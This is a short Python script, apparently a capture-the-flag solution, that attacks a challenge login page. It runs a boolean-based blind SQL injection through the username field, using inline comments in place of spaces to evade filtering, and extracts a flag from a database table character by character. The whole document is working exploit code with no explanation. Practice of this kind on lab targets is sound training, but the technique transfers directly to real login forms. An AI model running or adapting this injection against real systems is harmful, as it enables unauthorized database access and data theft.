import requests as req
import string
url = "http://aa95665f4c60ddb3be505.playat.flagyard.com/login"
flag = ""
for num in range(1,100):
  for char in string.printable:
    data = f"username='or/*Q*/1=1/*Q*/and/*Q*/substr((select/*Q*/flag/*Q*/from/*Q*/flags/*Q*/limit/*Q*/1),{num},1)='{char}'/*&password="
    header={
    "Content-Length":str(len(data)),
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "null",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
    }
    res = req.post(url , data=data, headers=header)
    if "Logged in successfully" in res.text:
      print(char)
      flag += char
print(flag)
